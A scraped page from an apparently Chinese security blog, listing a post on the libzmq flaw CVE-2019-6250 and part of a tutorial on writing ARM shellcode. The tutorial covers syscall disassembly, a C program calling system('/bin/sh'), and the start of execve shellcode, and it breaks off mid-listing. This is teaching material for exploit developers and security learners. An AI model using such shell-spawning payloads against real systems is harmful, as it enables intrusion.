	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/08/17/CVE-2019-6250/" >CVE-2019-6250 libzmq远程代码执行漏洞分析</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-08-17  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	

		
        
            
            
		

	

	</div>
  <a type="button" href="/2021/08/17/CVE-2019-6250/#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		
	
	</div>
  <a type="button" href="/2021/08/17/CVE-2019-6250/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/08/16/ARM Shellcode的编写/" >ARM Shellcode</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-08-16  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	

		
        
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
            
            
		
		
            
            <p class="post">&lt;h2 id=&#34;系统调用&#34;&gt;&lt;a href=&#34;#系统调用&#34; class=&#34;headerlink&#34; title=&#34;系统调用&#34;&gt;&lt;/a&gt;系统调用&lt;/h2&gt;&lt;p&gt;从write说起：&lt;/p&gt;
&lt;p&gt;在linux中的原型为：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;size_t&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;keyword&#34;&gt;int&lt;/span&gt; fd, &lt;span class=&#34;keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; *buf, &lt;span class=&#34;keyword&#34;&gt;size_t&lt;/span&gt; count)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;在c语言中的使用方法如下：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;string&lt;/span&gt;[&lt;span class=&#34;number&#34;&gt;13&lt;/span&gt;] = &lt;span class=&#34;string&#34;&gt;&amp;quot;Hello world\n&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;write(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;string&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;string&lt;/span&gt;));        &lt;span class=&#34;comment&#34;&gt;// Here sizeof(string) is 13&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;把write的系统调用的汇编代码提取出来。如下：&lt;/p&gt;
&lt;figure class=&#34;highlight arm&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x000270b0&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;ldr&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r12&lt;/span&gt;, [&lt;span class=&#34;built_in&#34;&gt;pc&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#96&lt;/span&gt;] &lt;span class=&#34;comment&#34;&gt;; 0x27118&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x000270b4&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;ldr&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r12&lt;/span&gt;, [&lt;span class=&#34;built_in&#34;&gt;pc&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;r12&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;=&amp;gt; &lt;span class=&#34;number&#34;&gt;0x000270b8&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;teq&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r12&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x000270bc&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;push&lt;/span&gt; &amp;#123;&lt;span class=&#34;built_in&#34;&gt;r7&lt;/span&gt;&amp;#125;  &lt;span class=&#34;comment&#34;&gt;; (str r7, [sp, #-4]!)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x000270c0&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;bne&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x270dc&lt;/span&gt; &amp;lt;write+&lt;span class=&#34;number&#34;&gt;44&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x000270c4&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r7&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x000270c8&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;svc&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;fd, buf, count 分别保存在r0,r1,r2中，r7 存放着系统调用号，代表着write这个系统调用。&lt;/p&gt;
&lt;p&gt;fd – 1 for STDOUT&lt;br&gt;buf – pointer to a string&lt;br&gt;count – number of bytes to write -&amp;gt; 13&lt;br&gt;syscall number of write -&amp;gt; 0x4&lt;/p&gt;
&lt;p&gt;直接使用系统调用的方式：&lt;/p&gt;
&lt;figure class=&#34;highlight arm&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt;   &lt;span class=&#34;built_in&#34;&gt;r0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#1&lt;/span&gt;      &lt;span class=&#34;comment&#34;&gt;@ fd 1 = STDOUT&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;ldr&lt;/span&gt;   &lt;span class=&#34;built_in&#34;&gt;r1&lt;/span&gt;, string  &lt;span class=&#34;comment&#34;&gt;@ loading the string from memory to R1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt;   &lt;span class=&#34;built_in&#34;&gt;r2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#13&lt;/span&gt;     &lt;span class=&#34;comment&#34;&gt;@ write 13 bytes to STDOUT &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt;   &lt;span class=&#34;built_in&#34;&gt;r7&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#4&lt;/span&gt;      &lt;span class=&#34;comment&#34;&gt;@ Syscall 0x4 = write()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;svc&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;#0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;1-trace-system-call&#34;&gt;&lt;a href=&#34;#1-trace-system-call&#34; class=&#34;headerlink&#34; title=&#34;1.trace system call&#34;&gt;&lt;/a&gt;1.trace system call&lt;/h3&gt;&lt;p&gt;使用下面的简单例程，然后把它转化成汇编代码：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    system(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;strace -f -v &amp;lt;filename&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;execve(&amp;quot;/usr/bin/test&amp;quot;, [&amp;quot;test&amp;quot;], [...]) = 0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;2-system-call-number-and-parameters&#34;&gt;&lt;a href=&#34;#2-system-call-number-and-parameters&#34; class=&#34;headerlink&#34; title=&#34;2.system call number and parameters&#34;&gt;&lt;/a&gt;2.system call number and parameters&lt;/h3&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;NAME&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    execve - execute program&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SYNOPSIS&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;int&lt;/span&gt;  &lt;span class=&#34;title&#34;&gt;execve&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;char&lt;/span&gt; *filename, &lt;span class=&#34;keyword&#34;&gt;char&lt;/span&gt; *&lt;span class=&#34;keyword&#34;&gt;const&lt;/span&gt; argv [], &lt;span class=&#34;keyword&#34;&gt;char&lt;/span&gt; *&lt;span class=&#34;keyword&#34;&gt;const&lt;/span&gt; envp[])&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&#34;highlight arm&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;=&amp;gt; &lt;span class=&#34;number&#34;&gt;0x000264d0&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;push&lt;/span&gt; &amp;#123;&lt;span class=&#34;built_in&#34;&gt;r7&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;lr&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x000264d4&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r7&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#11&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x000264d8&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;svc&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x000264dc&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;cmn&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#4096&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;; 0x1000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x000264e0&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r3&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;r0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x000264e4&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;bhi&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x264f0&lt;/span&gt; &amp;lt;execve+&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x000264e8&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r0&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;r3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x000264ec&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;28&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;pop&lt;/span&gt; &amp;#123;&lt;span class=&#34;built_in&#34;&gt;r7&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;pc&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x000264f0&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;ldr&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r2&lt;/span&gt;, [&lt;span class=&#34;built_in&#34;&gt;pc&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#20&lt;/span&gt;] &lt;span class=&#34;comment&#34;&gt;; 0x2650c &amp;lt;execve+60&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x000264f4&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;36&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;rsb&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r1&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;r0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x000264f8&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;ldr&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r2&lt;/span&gt;, [&lt;span class=&#34;built_in&#34;&gt;pc&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;r2&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x000264fc&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;44&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;bl&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x11520&lt;/span&gt; &amp;lt;__aeabi_read_tp&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x00026500&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;48&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;mvn&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r3&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x00026504&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;52&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r1&lt;/span&gt;, [&lt;span class=&#34;built_in&#34;&gt;r0&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;r2&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x00026508&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;56&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;b&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x264e8&lt;/span&gt; &amp;lt;execve+&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x0002650c&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;60&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;andeq&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r0&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;r7&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;r0&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;asr&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;#31&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;syscall为11&lt;/p&gt;
&lt;figure class=&#34;highlight arm&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;symbol&#34;&gt;.section&lt;/span&gt; &lt;span class=&#34;meta&#34;&gt;.text&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;symbol&#34;&gt;.global&lt;/span&gt; _start&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;symbol&#34;&gt;_start:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;add&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r0&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;pc&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#12&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    